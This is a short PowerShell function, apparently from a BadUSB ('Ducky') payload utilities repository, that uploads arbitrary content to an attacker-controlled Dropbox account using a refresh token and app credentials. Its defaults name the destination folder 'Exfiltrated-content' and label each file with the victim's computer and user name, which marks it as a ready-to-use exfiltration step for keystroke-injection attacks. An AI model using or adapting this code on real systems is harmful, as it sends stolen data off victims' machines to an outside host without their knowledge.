function Send-ToDropbox {
    #Documentation: https://github.com/PlumpyTurkey/Ducky-Utilities/tree/main/PowerShell-Functions/Send-ToDropbox

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RefreshToken,
        [Parameter(Mandatory = $true)]
        [string]$AppKey,
        [Parameter(Mandatory = $true)]
        [string]$AppSecret,
        [Parameter(Mandatory = $true)]
        [string]$Content,
        [string]$OutputFolder = "Exfiltrated-content",
        [string]$OutputFile = "[${env:COMPUTERNAME}-${env:USERNAME}].txt"
    )
    
    try {
        $AccessToken = (Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers @{
                "Content-Type" = "application/x-www-form-urlencoded"
            } -Body @{
                "grant_type" = "refresh_token"
                "refresh_token" = $RefreshToken
                "client_id" = $AppKey
                "client_secret" = $AppSecret
            }).access_token
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type" = "application/octet-stream"
            "Dropbox-API-Arg" = "{""path"":""/$OutputFolder/$OutputFile"",""mode"":""add"",""autorename"":true,""mute"":false}"
        } -Body $Content | Out-Null
    }
    catch {
        Write-Host "An error occurred: $_"
    }
}
